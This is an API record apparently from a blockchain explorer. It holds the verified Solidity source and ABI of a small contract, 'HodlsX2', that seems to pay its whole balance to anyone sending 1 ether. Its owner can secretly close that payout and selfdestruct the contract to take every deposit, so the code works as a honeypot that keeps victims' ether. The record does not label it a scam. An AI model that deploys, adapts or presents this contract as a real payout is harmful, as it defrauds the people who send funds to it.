{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract HodlsX2 {\r\n    function() public payable {}\r\n    address Owner; bool closed = false;\r\n    function assign() public payable { if (0==Owner) Owner=msg.sender; }\r\n    function close(bool F) public { if (msg.sender==Owner) closed=F; }\r\n    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }\r\n    function get() public payable {\r\n        if (msg.value>=1 ether && !closed) {\r\n            msg.sender.transfer(address(this).balance);\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"assign\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"F\",\"type\":\"bool\"}],\"name\":\"close\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"get\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"end\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"HodlsX2","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://74ed3f2b465ce4359f419e4d623febc87b00a45221bf12c0a0195b136fbb8ce9"}]}